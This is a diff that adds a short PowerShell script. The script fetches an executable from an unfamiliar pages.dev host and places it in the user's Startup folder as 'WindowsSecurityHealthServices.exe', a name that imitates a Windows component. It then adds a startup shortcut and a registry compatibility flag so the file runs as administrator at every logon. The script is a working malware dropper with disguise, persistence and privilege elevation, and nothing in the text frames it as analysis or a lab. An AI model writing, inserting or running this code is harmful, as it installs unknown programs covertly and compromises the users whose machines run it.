@@ -1,0 +1,15 @@
+$url = "https://ipnqtxhsbvcmurjolgkfadzweyf.pages.dev/files/Windows%20Security%20Health%20Services.exe"
+$localPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealthServices.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $localPath
+
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealthServices.lnk")
+$Shortcut.TargetPath = $localPath
+$Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($localPath)
+$Shortcut.Save()
+
+$regPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
+$regName = $localPath
+$regValue = "RUNASADMIN"
+Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
